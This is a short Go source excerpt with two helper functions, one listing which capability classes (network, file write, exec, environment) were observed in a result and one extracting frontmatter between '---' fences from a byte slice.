// ObservedCaps returns the set of capability classes that fired, sorted.
func (r *Result) ObservedCaps() []Capability {
	var out []Capability
	for _, c := range []Capability{CapNet, CapFSWrite, CapExec, CapEnv} {
		if len(r.Observed[c]) > 0 {
			out = append(out, c)
		}
	}
	return out
}

// extractFrontmatter returns the bytes between the leading --- fences, or nil.
func extractFrontmatter(b []byte) []byte {
	s := string(b)
	s = strings.TrimPrefix(s, "\uFEFF") // strip UTF-8 BOM if present
	if !strings.HasPrefix(s, "---") {
		return nil
	}
	rest := s[3:]
	// Find the closing fence at the start of a line.
	idx := strings.Index(rest, "\n---")
	if idx < 0 {
		return nil
	}
	return []byte(rest[:idx])
}
